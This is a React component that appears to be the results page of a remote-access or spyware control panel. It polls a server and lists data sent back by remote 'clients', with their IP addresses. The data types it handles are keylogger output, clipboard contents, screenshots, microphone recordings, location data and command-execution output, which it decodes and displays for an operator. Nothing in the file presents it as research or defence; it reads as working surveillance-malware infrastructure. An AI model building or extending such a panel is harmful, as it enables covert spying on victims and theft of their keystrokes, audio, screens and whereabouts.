import React, { useState, useEffect } from 'react';
import { api } from '../api';

const CAPABILITIES = {
  1: 'Audio Recorder',
  2: 'Clipboard Monitor',
  3: 'Keylogger',
  4: 'Screenshot',
  5: 'Info Collector',
  6: 'Command Executor',
  7: 'Location Collector'
};

function Results() {
  const [results, setResults] = useState([]);
  const [selectedResult, setSelectedResult] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchResults();
    const interval = setInterval(fetchResults, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchResults = async () => {
    try {
      const data = await api.getResults(50);
      setResults(data.results || []);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching results:', error);
      setLoading(false);
    }
  };

  const decodeBase64 = (str) => {
    try {
      return atob(str);
    } catch {
      return null;
    }
  };

  const renderResultData = (result) => {
    const { result: data, result_type } = result;
    
    if (!data) return <p>No data</p>;

    if (result_type === 'text') {
      const decoded = decodeBase64(data);
      return (
        <div>
          <textarea
            readOnly
            value={decoded || data}
            style={{ 
              width: '100%', 
              minHeight: '200px', 
              fontFamily: 'monospace',
              fontSize: '0.85rem',
              background: '#0d1117',
              color: '#c9d1d9',
              border: '1px solid #30363d',
              borderRadius: '6px',
              padding: '1rem'
            }}
          />
        </div>
      );
    }

    if (result_type === 'image') {
      return (
        <div>
          <img 
            src={`data:image/png;base64,${data}`} 
            alt="Screenshot"
            style={{ maxWidth: '100%', borderRadius: '6px' }}
          />
        </div>
      );
    }

    if (result_type === 'audio') {
      return (
        <div>
          <audio controls style={{ width: '100%' }}>
            <source src={`data:audio/wav;base64,${data}`} />
          </audio>
        </div>
      );
    }

    return (
      <textarea
        readOnly
        value={data.substring(0, 1000)}
        style={{ 
          width: '100%', 
          minHeight: '200px', 
          fontFamily: 'monospace',
          fontSize: '0.85rem'
        }}
      />
    );
  };

  if (loading) {
    return <div className="loading">Loading results...</div>;
  }

  if (selectedResult) {
    return (
      <div>
        <div className="card">
          <button className="btn btn-secondary" onClick={() => setSelectedResult(null)}>
            ← Back to Results
          </button>
          
          <h2 style={{ marginTop: '1rem' }}>Result Details</h2>
          
          <div className="info-block" style={{ marginTop: '1rem' }}>
            <div><strong>Client:</strong> <code>{selectedResult.client}</code></div>
            <div><strong>IP:</strong> {selectedResult.ip}</div>
            <div><strong>Capability:</strong> {CAPABILITIES[selectedResult.capability]}</div>
            <div><strong>Type:</strong> {selectedResult.result_type}</div>
            <div><strong>Timestamp:</strong> {new Date(selectedResult.timestamp).toLocaleString()}</div>
          </div>

          <div style={{ marginTop: '1.5rem' }}>
            {renderResultData(selectedResult)}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="card">
      <h2>Execution Results ({results.length})</h2>
      
      {results.length === 0 ? (
        <div className="empty-state">
          <p>No results yet</p>
          <small>Results will appear here after sending commands</small>
        </div>
      ) : (
        <div className="table-container">
          <table className="table">
            <thead>
              <tr>
                <th>Time</th>
                <th>Client</th>
                <th>Capability</th>
                <th>Type</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {results.map((result, idx) => (
                <tr key={idx}>
                  <td>{new Date(result.timestamp).toLocaleString()}</td>
                  <td><code>{result.client}</code></td>
                  <td>{CAPABILITIES[result.capability]}</td>
                  <td>
                    {result.result_type === 'text' && '📝 Text'}
                    {result.result_type === 'image' && '🖼️ Image'}
                    {result.result_type === 'audio' && '🔊 Audio'}
                    {!result.result_type && 'Unknown'}
                  </td>
                  <td>
                    <button className="btn" onClick={() => setSelectedResult(result)}>
                      View
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

export default Results;
